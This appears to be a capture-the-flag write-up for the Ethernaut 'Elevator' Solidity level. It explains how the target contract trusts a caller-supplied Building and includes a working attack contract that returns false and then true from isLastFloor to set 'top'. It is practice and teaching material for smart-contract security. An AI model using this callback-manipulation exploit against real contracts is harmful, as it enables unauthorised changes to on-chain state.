#ELEVATOR
##Objective : 
to allow floor to be set, first call to isLastFloor() should return false , also the second call to  isLastFloor() function should  return true top is set to true.

the challenge is to return to different result as now  , it is the same function being called twice with the same argument.

interface can only have the function signature and no function implementation. building instance is  used inside the function to check if the function isLastFloor  returns t or f .

goTo function creates an instance of the Building interface, taking the address as the address of the msg.sender.

make our own Building contract and implement a function isLastFloor following a similar structure as  in the Building interface. 
this helps us take control over return values from isLastFloor

basically overriding isLastFloor() to return different values each time using a boolean state variable.


##exploit code:
```// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract BrokenElevator {

    Elevator level11 = Elevator(0x982EC93bbf33aF2c61349483d4D606414a4F5b1b);
    bool public counter = false;

    function gotoFloor() public {
        level11.goTo(1);
    }

    function isLastFloor(uint _floor) public returns (bool) {
        if (!counter) { 
            counter = true; 
            return false; 
        } else {
            counter = false; 
            return true; 
        }
    }
}
```

